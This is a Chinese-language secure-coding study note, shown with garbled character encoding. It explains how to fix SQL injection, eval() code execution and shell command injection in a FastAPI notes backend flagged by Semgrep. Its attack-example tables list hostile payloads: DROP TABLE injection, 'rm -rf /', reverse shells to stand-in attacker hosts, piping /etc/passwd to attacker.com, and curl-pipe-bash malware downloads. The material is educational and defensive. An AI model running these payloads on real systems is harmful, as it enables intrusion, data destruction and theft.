# Week 6: å®‰å…¨æ¼æ´žä¿®å¤åŽŸç†è¯¦è§£

> **å­¦ä¹ æ—¥æœŸ**: 2026-01-08
> **ä¸»é¢˜**: Semgrepé™æ€åˆ†æžä¸Žå®‰å…¨æ¼æ´žä¿®å¤
> **å·¥å…·**: Semgrep 1.146.0

---

## ðŸ“š ç›®å½•

1. [SQLæ³¨å…¥æ¼æ´ž](#1-sqlæ³¨å…¥æ¼æ´ž)
2. [eval()ä»»æ„ä»£ç æ‰§è¡Œ](#2-evalä»»æ„ä»£ç æ‰§è¡Œ)
3. [å‘½ä»¤æ³¨å…¥æ¼æ´ž](#3-å‘½ä»¤æ³¨å…¥æ¼æ´ž)
4. [ä¿®å¤æ€»ç»“](#ä¿®å¤æ€»ç»“)

---

## 1. SQLæ³¨å…¥æ¼æ´ž

### 1.1 æ¼æ´žä½ç½®

**æ–‡ä»¶**: `week6/backend/app/routers/notes.py:71-79`

### 1.2 å±é™©ä»£ç 

```python
@router.get("/unsafe_search")
async def unsafe_search(q: str):
    sql = text(
        f"""
        SELECT id, title, content, created_at, updated_at
        FROM notes
        WHERE title LIKE '%{q}%' OR content LIKE '%{q}%'
        ORDER BY created_at DESC
        LIMIT 50
        """
    )
    # ... æ‰§è¡ŒæŸ¥è¯¢
```

### 1.3 ä¸ºä»€ä¹ˆè¿™å¾ˆå±é™©ï¼Ÿ

#### åŽŸç†å›¾è§£

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  SQLæ³¨å…¥æ”»å‡»æµç¨‹                                            â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

æ­¥éª¤1: ç”¨æˆ·è¾“å…¥æ¶æ„æ•°æ®
  è¾“å…¥: q = "'; DROP TABLE notes; --"

æ­¥éª¤2: æœåŠ¡å™¨ç›´æŽ¥æ‹¼æŽ¥SQL
  f"SELECT * WHERE title LIKE '%{q}%'"
  â†“
  "SELECT * WHERE title LIKE '%'; DROP TABLE notes; --%'"

æ­¥éª¤3: æ•°æ®åº“è§£æžå¹¶æ‰§è¡Œ
  â†“
  è¯­å¥1: SELECT * WHERE title LIKE '%';    â† æŸ¥è¯¢
  è¯­å¥2: DROP TABLE notes;                 â† åˆ é™¤è¡¨ï¼
  è¯­å¥3: --%'                               â† æ³¨é‡Šï¼ˆè¢«å¿½ç•¥ï¼‰

ç»“æžœ: ðŸ’¥ æ•°æ®è¡¨è¢«åˆ é™¤ï¼
```

#### æ”»å‡»ç¤ºä¾‹

| è¾“å…¥ç±»åž‹ | ç”¨æˆ·è¾“å…¥ | å®žé™…æ‰§è¡Œçš„SQL |
|---------|---------|--------------|
| **æ­£å¸¸è¾“å…¥** | `python` | `WHERE title LIKE '%python%'` âœ… |
| **SQLæ³¨å…¥** | `'; DROP TABLE notes; --` | `WHERE title LIKE '%'; DROP TABLE notes; --%'` ðŸ’¥ |
| **æ•°æ®æ³„éœ²** | `' OR '1'='1` | `WHERE title LIKE '%' OR '1'='1'` ðŸ’¥ |
| **è®¤è¯ç»•è¿‡** | `' OR '1'='1' --` | `SELECT * FROM users WHERE username = '' OR '1'='1' --` ðŸ’¥ |

### 1.4 ä¿®å¤æ–¹æ¡ˆ

#### âŒ é”™è¯¯æ–¹å¼ï¼šæ‰‹åŠ¨è½¬ä¹‰

```python
# ä¸è¦è¿™æ ·åšï¼
q = q.replace("'", "''")  # å¯èƒ½è¢«ç»•è¿‡
```

**ä¸ºä»€ä¹ˆä¸è¡Œï¼Ÿ**
- è½¬ä¹‰è§„åˆ™å¤æ‚ï¼Œå®¹æ˜“é—æ¼
- ä¸åŒæ•°æ®åº“è½¬ä¹‰è§„åˆ™ä¸åŒ
- äºŒæ¬¡æ³¨å…¥é—®é¢˜

#### âœ… æ­£ç¡®æ–¹å¼ï¼šå‚æ•°åŒ–æŸ¥è¯¢

```python
from sqlalchemy import or_

@router.get("/search")
async def search(q: str, db: Session = Depends(get_db)):
    # ä½¿ç”¨ORMæŸ¥è¯¢
    notes = db.query(Note).filter(
        or_(
            Note.title.like(f"%{q}%"),
            Note.content.like(f"%{q}%")
        )
    ).order_by(Note.created_at.desc()).limit(50).all()

    return {"items": notes}
```

**ä¸ºä»€ä¹ˆè¿™æ ·å®‰å…¨ï¼Ÿ**

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  å‚æ•°åŒ–æŸ¥è¯¢ vs å­—ç¬¦ä¸²æ‹¼æŽ¥                                    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

âŒ å­—ç¬¦ä¸²æ‹¼æŽ¥ï¼ˆä¸å®‰å…¨ï¼‰:
  1. æž„é€ å®Œæ•´SQLå­—ç¬¦ä¸²
  2. å‘é€åˆ°æ•°æ®åº“
  3. æ•°æ®åº“è§£æžSQL + æ‰§è¡Œ
  é—®é¢˜: ç”¨æˆ·è¾“å…¥è¢«å½“ä½œSQLä»£ç 

âœ… å‚æ•°åŒ–æŸ¥è¯¢ï¼ˆå®‰å…¨ï¼‰:
  1. å‘é€SQLæ¨¡æ¿ï¼ˆå¸¦å ä½ç¬¦ï¼‰
  2. æ•°æ®åº“è§£æžå¹¶ç¼“å­˜SQLç»“æž„
  3. å‘é€å‚æ•°å€¼ï¼ˆå·²ç»è½¬ä¹‰ï¼‰
  4. æ•°æ®åº“æ‰§è¡Œ
  å®‰å…¨: ç”¨æˆ·è¾“å…¥åªèƒ½ä½œä¸ºæ•°æ®å€¼

å›¾è§£:
  SQL: SELECT * WHERE title LIKE ?
  å‚æ•°: "'; DROP TABLE notes; --"
  ç»“æžœ: WHERE title LIKE '%'; DROP TABLE notes; --%'
       â†‘ æŸ¥æ‰¾åŒ…å«è¿™ä¸ªå­—ç¬¦ä¸²çš„æ ‡é¢˜ï¼Œè€Œä¸æ˜¯æ‰§è¡ŒSQL
```

### 1.5 SQLAlchemyæŸ¥è¯¢æ–¹å¼å¯¹æ¯”

```python
from sqlalchemy import or_, and_, not_
from models import Note

# æ–¹å¼1: ORMæŸ¥è¯¢ï¼ˆæŽ¨èï¼‰
notes = db.query(Note).filter(
    or_(
        Note.title.like(f"%{q}%"),
        Note.content.like(f"%{q}%")
    )
).all()

# æ–¹å¼2: ä½¿ç”¨bindparamï¼ˆæ›´å®‰å…¨ï¼‰
from sqlalchemy import bindparam
stmt = text("""
    SELECT id, title, content, created_at, updated_at
    FROM notes
    WHERE title LIKE :q OR content LIKE :q
    ORDER BY created_at DESC
    LIMIT 50
""")
stmt = stmt.bindparams(q=f"%{q}%")
results = db.execute(stmt)

# æ–¹å¼3: åŽŸç”ŸSQLï¼ˆè°¨æ…Žä½¿ç”¨ï¼‰
# ç¡®ä¿ä½¿ç”¨å‚æ•°åŒ–ï¼Œä¸è¦ç”¨f-string
```

---

## 2. eval()ä»»æ„ä»£ç æ‰§è¡Œ

### 2.1 æ¼æ´žä½ç½®

**æ–‡ä»¶**: `week6/backend/app/routers/notes.py:104`

### 2.2 å±é™©ä»£ç 

```python
@router.get("/debug/eval")
async def debug_eval(expr: str = Query(...)):
    result = str(eval(expr))  # noqa: S307
    return {"result": result}
```

### 2.3 ä¸ºä»€ä¹ˆè¿™å¾ˆå±é™©ï¼Ÿ

#### åŽŸç†å›¾è§£

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  eval() ä»£ç æ‰§è¡Œæ”»å‡»æµç¨‹                                     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

æ­¥éª¤1: ç”¨æˆ·è¾“å…¥æ¶æ„è¡¨è¾¾å¼
  è¾“å…¥: expr = "__import__('os').system('rm -rf /')"

æ­¥éª¤2: eval() è§£æžå¹¶æ‰§è¡ŒPythonä»£ç 
  eval("__import__('os').system('rm -rf /')")
  â†“
  Pythonè§£é‡Šå™¨æ‰§è¡Œ:
    1. __import__('os')        â†’ å¯¼å…¥osæ¨¡å—
    2. .system('rm -rf /')     â†’ è°ƒç”¨systemå‡½æ•°
    3. æ‰§è¡Œshellå‘½ä»¤           â†’ åˆ é™¤æ‰€æœ‰æ–‡ä»¶ï¼

ç»“æžœ: ðŸ’¥ æœåŠ¡å™¨è¢«å®Œå…¨æŽ§åˆ¶ï¼
```

#### æ”»å‡»ç¤ºä¾‹

| æ”»å‡»ç±»åž‹ | æ¶æ„è¾“å…¥ | æ‰§è¡Œç»“æžœ |
|---------|---------|---------|
| **æ–‡ä»¶è¯»å–** | `open('/etc/passwd').read()` | è¯»å–ç³»ç»Ÿå¯†ç æ–‡ä»¶ |
| **æ–‡ä»¶åˆ é™¤** | `__import__('os').system('rm -rf /')` | åˆ é™¤æ‰€æœ‰æ–‡ä»¶ |
| **æ•°æ®çªƒå–** | `__import__('pickle').loads(open('db.sqlite','rb').read())` | è¯»å–æ•°æ®åº“ |
| **åå‘Shell** | `__import__('os').system('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1')` | èŽ·å–è¿œç¨‹æŽ§åˆ¶ |
| **ä¿¡æ¯æ”¶é›†** | `__import__('socket').gethostname()` | èŽ·å–æœåŠ¡å™¨ä¿¡æ¯ |
| **çŽ¯å¢ƒå˜é‡** | `__import__('os').environ` | èŽ·å–æ‰€æœ‰çŽ¯å¢ƒå˜é‡ï¼ˆåŒ…æ‹¬å¯†é’¥ï¼‰|

### 2.4 ä¿®å¤æ–¹æ¡ˆ

#### âœ… æ–¹æ¡ˆAï¼šç›´æŽ¥åˆ é™¤ç«¯ç‚¹ï¼ˆæŽ¨èï¼‰

```python
# å®Œå…¨åˆ é™¤è¿™ä¸ªç«¯ç‚¹
# åŽŸå› :
# 1. è°ƒè¯•ç«¯ç‚¹ä¸åº”æš´éœ²åœ¨ç”Ÿäº§çŽ¯å¢ƒ
# 2. eval()æ²¡æœ‰å®‰å…¨çš„ç”¨æ³•
# 3. åº”ä½¿ç”¨ä¸“ä¸šè°ƒè¯•å·¥å…·ï¼ˆpdbã€ipdbï¼‰
```

#### âš ï¸ æ–¹æ¡ˆBï¼šå—é™è¡¨è¾¾å¼æ±‚å€¼å™¨ï¼ˆä¸æŽ¨èï¼Œä»…ä¾›å‚è€ƒï¼‰

```python
from asteval import Interpreter

# åˆ›å»ºå—é™çš„è§£é‡Šå™¨
safe_eval = Interpreter()

# åªæ”¯æŒæ•°å­¦è¡¨è¾¾å¼
result = safe_eval(expr)  # åªèƒ½è®¡ç®— 1+2, math.sin(x) ç­‰

# ä¸æ”¯æŒ:
# - å¯¼å…¥æ¨¡å—
# - å‡½æ•°è°ƒç”¨ï¼ˆé™¤äº†ç™½åå•ï¼‰
# - æ–‡ä»¶æ“ä½œ
# - ç³»ç»Ÿå‘½ä»¤
```

**ä¸ºä»€ä¹ˆä»ç„¶ä¸æŽ¨èï¼Ÿ**
- ä»ç„¶å¯èƒ½æœ‰ç»•è¿‡æ–¹æ³•
- ç»´æŠ¤æˆæœ¬é«˜
- è°ƒè¯•ç«¯ç‚¹æœ¬èº«å°±ä¸åº”è¯¥å­˜åœ¨

### 2.5 Pythonå±é™©å‡½æ•°åˆ—è¡¨

| å‡½æ•° | å±é™©ç­‰çº§ | é£Žé™© | æ›¿ä»£æ–¹æ¡ˆ |
|-----|---------|------|---------|
| `eval()` | ðŸ”´ æžé«˜ | æ‰§è¡Œä»»æ„ä»£ç  | åˆ é™¤æˆ–ä½¿ç”¨asteval |
| `exec()` | ðŸ”´ æžé«˜ | æ‰§è¡Œä»»æ„ä»£ç  | åˆ é™¤ |
| `__import__()` | ðŸŸ  é«˜ | å¯¼å…¥å±é™©æ¨¡å— | ä½¿ç”¨ç™½åå• |
| `compile()` | ðŸŸ  é«˜ | ç¼–è¯‘æ¶æ„ä»£ç  | åˆ é™¤ |
| `open()` | ðŸŸ¡ ä¸­ | è¯»å–æ•æ„Ÿæ–‡ä»¶ | ä½¿ç”¨æ²™ç®± |
| `pickle.loads()` | ðŸ”´ æžé«˜ | RCEæ¼æ´ž | ä½¿ç”¨json |

---

## 3. å‘½ä»¤æ³¨å…¥æ¼æ´ž

### 3.1 æ¼æ´žä½ç½®

**æ–‡ä»¶**: `week6/backend/app/routers/notes.py:112`

### 3.2 å±é™©ä»£ç 

```python
@router.get("/debug/run")
async def debug_run(cmd: str = Query(...)):
    completed = subprocess.run(
        cmd,
        shell=True,  # âš ï¸ å±é™©ï¼
        capture_output=True,
        text=True
    )
    return {"output": completed.stdout}
```

### 3.3 ä¸ºä»€ä¹ˆè¿™å¾ˆå±é™©ï¼Ÿ

#### åŽŸç†å›¾è§£

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  å‘½ä»¤æ³¨å…¥æ”»å‡»æµç¨‹                                            â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

æ­¥éª¤1: ç”¨æˆ·è¾“å…¥æ¶æ„å‘½ä»¤
  è¾“å…¥: cmd = "echo hello; rm -rf /"

æ­¥éª¤2: subprocess.run() è°ƒç”¨shell
  subprocess.run(cmd, shell=True)
  â†“
  /bin/sh -c "echo hello; rm -rf /"

æ­¥éª¤3: shellè§£æžå¹¶æ‰§è¡Œ
  shellè§£æžå…ƒå­—ç¬¦:
  - ';'  â†’ å‘½ä»¤åˆ†éš”ç¬¦
  - '&'  â†’ åŽå°æ‰§è¡Œ
  - '|'  â†’ ç®¡é“
  - '$()' â†’ å‘½ä»¤æ›¿æ¢
  - '`'  â†’ å‘½ä»¤æ›¿æ¢

æ­¥éª¤4: æ‰§è¡Œå¤šä¸ªå‘½ä»¤
  å‘½ä»¤1: echo hello      â†’ è¾“å‡º "hello"
  å‘½ä»¤2: rm -rf /        â†’ åˆ é™¤æ‰€æœ‰æ–‡ä»¶ï¼

ç»“æžœ: ðŸ’¥ ç³»ç»Ÿè¢«ç ´åï¼
```

#### Shellå…ƒå­—ç¬¦é€ŸæŸ¥è¡¨

| å­—ç¬¦ | å«ä¹‰ | æ”»å‡»ç¤ºä¾‹ |
|-----|------|---------|
| `;` | å‘½ä»¤åˆ†éš”ç¬¦ | `echo hello; cat /etc/passwd` |
| `&` | åŽå°æ‰§è¡Œ | `evil & echo done` |
| `\|` | ç®¡é“ | `cat /etc/passwd \| nc attacker.com 1234` |
| `&&` | ANDæ¡ä»¶ | `evil && echo success` |
| `\|\|` | ORæ¡ä»¶ | `evil \|\| echo fallback` |
| `$()` | å‘½ä»¤æ›¿æ¢ | `echo $(cat /etc/shadow)` |
| `` ` `` | å‘½ä»¤æ›¿æ¢ï¼ˆæ—§å¼ï¼‰| `echo \`cat /etc/passwd\`` |
| `\n` | å‘½ä»¤åˆ†éš”ç¬¦ | `echo hello\ncat /etc/passwd` |
| `\t` | å‘½ä»¤åˆ†éš”ç¬¦ | `echo hello\tcat /etc/passwd` |

#### æ”»å‡»ç¤ºä¾‹

| æ”»å‡»ç±»åž‹ | æ¶æ„è¾“å…¥ | æ‰§è¡Œç»“æžœ |
|---------|---------|---------|
| **æ•°æ®å¤–æ³„** | `cat /etc/passwd \| curl -d @- http://attacker.com/steal` | å‘é€å¯†ç æ–‡ä»¶ |
| **åå‘Shell** | `bash -i >& /dev/tcp/ATTACKER/4444 0>&1` | èŽ·å–è¿œç¨‹æŽ§åˆ¶ |
| **ç«¯å£æ‰«æ** | `nc -zv target.com 1-65535` | æ‰«æå¼€æ”¾ç«¯å£ |
| **ä¸‹è½½æ¶æ„è½¯ä»¶** | `curl http://evil.com/malware.sh \| bash` | ä¸‹è½½å¹¶æ‰§è¡Œ |
| **æƒé™æå‡** | `sudo su -` | èŽ·å–rootæƒé™ |
| **æŒä¹…åŒ–** | `crontab -` | æ·»åŠ å®šæ—¶ä»»åŠ¡ |

### 3.4 ä¿®å¤æ–¹æ¡ˆ

#### âœ… æ–¹æ¡ˆAï¼šç›´æŽ¥åˆ é™¤ç«¯ç‚¹ï¼ˆæŽ¨èï¼‰

```python
# å®Œå…¨åˆ é™¤è¿™ä¸ªç«¯ç‚¹
# åŽŸå› : è°ƒè¯•ç«¯ç‚¹ä¸åº”æš´éœ²åœ¨ç”Ÿäº§çŽ¯å¢ƒ
```

#### âš ï¸ æ–¹æ¡ˆBï¼šä½¿ç”¨å®‰å…¨æ–¹å¼æ‰§è¡Œå‘½ä»¤

```python
import subprocess
import shlex

# âŒ é”™è¯¯æ–¹å¼
subprocess.run(user_input, shell=True)  # å±é™©ï¼

# âœ… æ­£ç¡®æ–¹å¼
# 1. é¢„å®šä¹‰å‘½ä»¤åˆ—è¡¨
ALLOWED_COMMANDS = {
    'ls': ['/bin/ls'],
    'echo': ['/bin/echo']
}

# 2. ä½¿ç”¨åˆ—è¡¨å‚æ•° + shell=False
if cmd_name in ALLOWED_COMMANDS:
    result = subprocess.run(
        [cmd_name, *args],  # åˆ—è¡¨å½¢å¼
        shell=False,         # å…³é”®ï¼ä¸ä½¿ç”¨shell
        capture_output=True,
        text=True
    )

# 3. ç™½åå•éªŒè¯
import shlex
cmd_parts = shlex.split(cmd)
if cmd_parts[0] in ALLOWED_COMMANDS:
    subprocess.run(cmd_parts, shell=False)
```

### 3.5 shell=True vs shell=False å¯¹æ¯”

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  shell=True vs shell=False                                   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

âŒ shell=True (å±é™©)
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚ subprocess.run("echo hi; cat /etc/passwd", shell=True)
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
           â†“
    è°ƒç”¨ /bin/sh -c "..."
           â†“
    è§£æž shell å…ƒå­—ç¬¦
           â†“
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚ echo hi       â”‚ cat /etc/passwdâ”‚  â† æ‰§è¡Œä¸¤ä¸ªå‘½ä»¤ï¼
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

âœ… shell=False (å®‰å…¨)
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚ subprocess.run(["echo", "hi; cat /etc/passwd"], shell=False)
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
           â†“
    ç›´æŽ¥æ‰§è¡Œç¨‹åºï¼Œä¸ç»è¿‡shell
           â†“
    å‚æ•°è¢«å½“ä½œå­—ç¬¦ä¸²ä¼ é€’
           â†“
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚ echo "hi; cat /etc/passwd"            â”‚  â† è¾“å‡ºå­—ç¬¦ä¸²æœ¬èº«
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

å¯¹æ¯”è¡¨:
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ ç‰¹æ€§         â”‚ shell=True       â”‚ shell=False      â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ å‘½ä»¤æ ¼å¼     â”‚ å­—ç¬¦ä¸²           â”‚ åˆ—è¡¨             â”‚
â”‚ Shellç‰¹æ€§    â”‚ æ”¯æŒé€šé…ç¬¦ã€ç®¡é“  â”‚ ä¸æ”¯æŒ           â”‚
â”‚ å…ƒå­—ç¬¦è§£æž   â”‚ è§£æžï¼ˆ; & \| $())â”‚ ä¸è§£æž           â”‚
â”‚ å®‰å…¨æ€§       â”‚ âŒ å±é™©          â”‚ âœ… å®‰å…¨          â”‚
â”‚ é€‚ç”¨åœºæ™¯     â”‚ å¯ä¿¡æ•°æ®         â”‚ âœ… ç”¨æˆ·è¾“å…¥      â”‚
â”‚ æ€§èƒ½         â”‚ æ…¢ï¼ˆå¯åŠ¨shellï¼‰  â”‚ å¿«ï¼ˆç›´æŽ¥æ‰§è¡Œï¼‰   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

---

## ä¿®å¤æ€»ç»“

### ðŸ“‹ ä¿®å¤æ¸…å•

| # | æ¼æ´žç±»åž‹ | ä¸¥é‡ç¨‹åº¦ | ä¿®å¤ç­–ç•¥ | ç†ç”± |
|---|---------|---------|---------|------|
| 1 | SQLæ³¨å…¥ | CRITICAL | ä½¿ç”¨å‚æ•°åŒ–æŸ¥è¯¢ | å¿…é¡»ä¿ç•™æœç´¢åŠŸèƒ½ |
| 2 | evalä»£ç æ‰§è¡Œ | CRITICAL | **åˆ é™¤æ•´ä¸ªç«¯ç‚¹** | è°ƒè¯•ç«¯ç‚¹ä¸åº”å­˜åœ¨ |
| 3 | å‘½ä»¤æ³¨å…¥ | CRITICAL | **åˆ é™¤æ•´ä¸ªç«¯ç‚¹** | è°ƒè¯•ç«¯ç‚¹ä¸åº”å­˜åœ¨ |

### ðŸŽ¯ ä¿®å¤åŽŸåˆ™

1. **æœ€å°æƒé™åŽŸåˆ™**: ä¸è¦ç»™ç”¨æˆ·æ‰§è¡Œä»£ç æˆ–å‘½ä»¤çš„èƒ½åŠ›
2. **é˜²å¾¡æ·±åº¦**: å¤šå±‚éªŒè¯ï¼ˆè¾“å…¥éªŒè¯ã€å‚æ•°åŒ–æŸ¥è¯¢ã€æœ€å°æƒé™ï¼‰
3. **ç™½åå•ä¼˜äºŽé»‘åå•**: æ˜Žç¡®å…è®¸ä»€ä¹ˆï¼Œè€Œä¸æ˜¯ç¦æ­¢ä»€ä¹ˆ
4. **åˆ é™¤ä¼˜äºŽä¿®å¤**: å¯¹äºŽä¸å¿…è¦çš„åŠŸèƒ½ï¼ˆå¦‚è°ƒè¯•ç«¯ç‚¹ï¼‰ï¼Œç›´æŽ¥åˆ é™¤

### ðŸ”’ å®‰å…¨ç¼–ç æœ€ä½³å®žè·µ

```python
# âœ… DO - å®‰å…¨å®žè·µ
# 1. ä½¿ç”¨ORM/å‚æ•°åŒ–æŸ¥è¯¢
db.query(User).filter(User.username == username)

# 2. é¿å…eval/exec/execfile
# å®Œå…¨ä¸è¦ç”¨

# 3. ä½¿ç”¨subprocessæ—¶shell=False
subprocess.run(['ls', '-la'], shell=False)

# 4. è¾“å…¥éªŒè¯
from pydantic import BaseModel, validator

class UserInput(BaseModel):
    username: str

    @validator('username')
    def validate_username(cls, v):
        if not re.match(r'^[a-zA-Z0-9_]+$', v):
            raise ValueError('Invalid username')
        return v

# 5. æ•æ„Ÿæ•°æ®ä½¿ç”¨çŽ¯å¢ƒå˜é‡
import os
api_key = os.getenv('API_KEY')
```

```python
# âŒ DON'T - å±é™©å®žè·µ
# 1. SQLæ‹¼æŽ¥
f"SELECT * FROM users WHERE username = '{username}'"

# 2. ä½¿ç”¨eval/exec
eval(user_input)

# 3. subprocess with shell=True
subprocess.run(user_input, shell=True)

# 4. ç¡¬ç¼–ç æ•æ„Ÿä¿¡æ¯
API_KEY = "sk_live_abc123"

# 5. å†…HTMLæ¸²æŸ“XSS
li.innerHTML = user_input
```

### ðŸ“– å»¶ä¼¸é˜…è¯»

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CWE-79: Cross-site Scripting (XSS)](https://cwe.mitre.org/data/definitions/79.html)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [CWE-94: Code Injection](https://cwe.mitre.org/data/definitions/94.html)

---

## ðŸ“ å­¦ä¹ ç¬”è®°

### å…³é”®è¦ç‚¹

1. **æ°¸è¿œä¸è¦ä¿¡ä»»ç”¨æˆ·è¾“å…¥** - å³ä½¿æ˜¯è®¤è¯ç”¨æˆ·
2. **å‚æ•°åŒ–æŸ¥è¯¢æ˜¯é˜²SQLæ³¨å…¥çš„æ ‡å‡†åšæ³•** - æ²¡æœ‰ç†ç”±ä½¿ç”¨æ‹¼æŽ¥
3. **eval/execæ²¡æœ‰å®‰å…¨ç”¨æ³•** - å¦‚æžœå¿…é¡»æ‰§è¡ŒåŠ¨æ€ä»£ç ï¼Œä½¿ç”¨ä¸“é—¨çš„æ²™ç®±
4. **shell=Trueåªåœ¨ç»å¯¹å¿…è¦æ—¶ä½¿ç”¨** - å¹¶ä¸”åªç”¨äºŽå¯ä¿¡æ•°æ®
5. **è°ƒè¯•ç«¯ç‚¹ä¸åº”è¯¥å­˜åœ¨äºŽç”Ÿäº§çŽ¯å¢ƒ** - ä½¿ç”¨å¼€å‘çŽ¯å¢ƒçš„ä¸“ä¸šå·¥å…·

### å¸¸è§è¯¯åŒº

âŒ **è¯¯åŒº1**: "æˆ‘å¯ä»¥æ‰‹åŠ¨è½¬ä¹‰ç”¨æˆ·è¾“å…¥"
